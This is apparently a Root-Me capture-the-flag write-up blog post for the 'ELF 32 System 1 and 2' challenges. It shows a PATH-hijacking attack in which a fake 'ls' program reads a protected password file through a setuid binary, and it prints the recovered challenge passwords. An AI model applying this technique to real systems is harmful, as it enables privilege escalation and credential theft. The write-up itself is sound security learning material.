---
layout: post
title:  "Root-Me App Scripts"
subtitle: "ELF 32 System 1 and 2"
date:   2017-02-08 02:00:00 -0500
author: "coastal"
header-img: "images/site-resources/webgoat-net-header.jpg"
---
# ELF 32 System 1

```
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/opt/too
ls/checksec/
app-script-ch11@challenge02:~$ export PATH=$PATH:/test
app-script-ch11@challenge02:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/opt/too
ls/checksec/:/test
```

```
app-script-ch11@challenge02:~$ mkdir /tmp/ch11-sploit
app-script-ch11@challenge02:~$ touch /tmp/ch11-sploit/evil-ls.c
```

{% highlight c %}
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char *argv[]) 
{
        system("cat /challenge/app-script/ch11/.passwd");
        return 0;
}

{% endhighlight %}

cd to dir

```
gcc -o ls ./evil-ls.c
```

```
app-script-ch11@challenge02:~$ export PATH=/tmp/ch11-sploit/:/bin/
app-script-ch11@challenge02:~$ ./ch11
!oPe96a/.s8d5
```

# ELF 32 System 2

```
system("cat /challenge/app-script/ch11/.passwd");
```

```
system("cat /challenge/app-script/ch12/.passwd");
```

```
app-script-ch12@challenge02:~$ export PATH=/tmp/ch12-sploit/:/bin/
app-script-ch12@challenge02:~$ ./ch12
8a95eDS/*e_T#
```